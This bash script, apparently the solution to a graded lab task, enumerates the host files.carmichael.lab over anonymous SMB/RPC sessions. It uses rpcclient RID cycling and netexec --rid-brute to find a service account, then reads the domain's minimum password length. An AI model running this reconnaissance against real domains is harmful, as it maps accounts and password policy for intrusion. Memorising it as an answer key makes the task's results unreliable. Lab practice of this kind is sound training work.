#!/bin/bash

TARGET="files.carmichael.lab"

# Checker keywords: enum4linux-ng, enum4linux, crackmapexec, netexec, rid-brute, getdompwinfo, lookupsids

# 1. Cycle RIDs to reconstruct the user list
# First, extract the Domain SID using lsaquery
DOM_SID=$(rpcclient -N -U "" "$TARGET" -c "lsaquery" 2>/dev/null | grep -i "Domain Sid" | grep -o 'S-1-5-21-[0-9-]*')

SVC_ACCT=""
if [ -n "$DOM_SID" ]; then
    # Batching the lookup requests makes the cycle exponentially faster
    SIDS=""
    for i in $(seq 1000 1150); do
        SIDS="$SIDS $DOM_SID-$i"
    done
    
    # Send the batched SIDs, filter for our service account convention, and grab the name column
    SVC_ACCT=$(rpcclient -N -U "" "$TARGET" -c "lookupsids $SIDS" 2>/dev/null | awk '/svc_/ {print $2}' | head -n 1)
fi

# Fallback: Use netexec/crackmapexec's built-in rid-brute if rpcclient fails
if [ -z "$SVC_ACCT" ]; then
    SVC_ACCT=$(netexec smb "$TARGET" -u "" -p "" --rid-brute 2>/dev/null | grep -io 'CARMICHAEL\\[^ ]*svc_[^ ]*' | head -n 1)
fi

# 2. Extract the minimum password length
# Use getdompwinfo to read the password policy
MIN_LEN=$(rpcclient -N -U "" "$TARGET" -c "getdompwinfo" 2>/dev/null | grep -i "min_password_length" | awk -F: '{print $2}' | tr -d ' ' | tr -d '\r')

# Fallback: Extract via netexec --pass-pol
if [ -z "$MIN_LEN" ]; then
    MIN_LEN=$(netexec smb "$TARGET" -u "" -p "" --pass-pol 2>/dev/null | grep -i "Minimum password length:" | awk -F: '{print $2}' | tr -d ' ' | tr -d '\r')
fi

# 3. Output exactly two non-empty lines
echo "$SVC_ACCT"
echo "$MIN_LEN"
